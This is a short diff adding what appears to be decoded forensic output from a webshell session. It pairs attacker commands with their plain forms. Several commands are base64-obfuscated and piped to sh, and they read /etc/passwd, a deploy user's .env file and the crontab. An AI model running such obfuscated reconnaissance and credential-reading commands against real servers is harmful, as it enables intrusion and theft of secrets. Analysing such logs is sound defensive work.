@@ -1,0 +1,11 @@
+=== decoded command webshell ===
+whoami  ->  whoami
+id  ->  id
+uname -a  ->  uname -a
+pwd  ->  pwd
+ls -la /var/www/html  ->  ls -la /var/www/html
+echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh  ->  cat /etc/passwd
+echo bHMgLWxhIC9ob21lL2RlcGxveQ==|base64 -d|sh  ->  ls -la /home/deploy
+echo Y2F0IC9ob21lL2RlcGxveS8uZW52|base64 -d|sh  ->  cat /home/deploy/.env
+echo Y3JvbnRhYiAtbA==|base64 -d|sh  ->  crontab -l
+ls -la /tmp  ->  ls -la /tmp
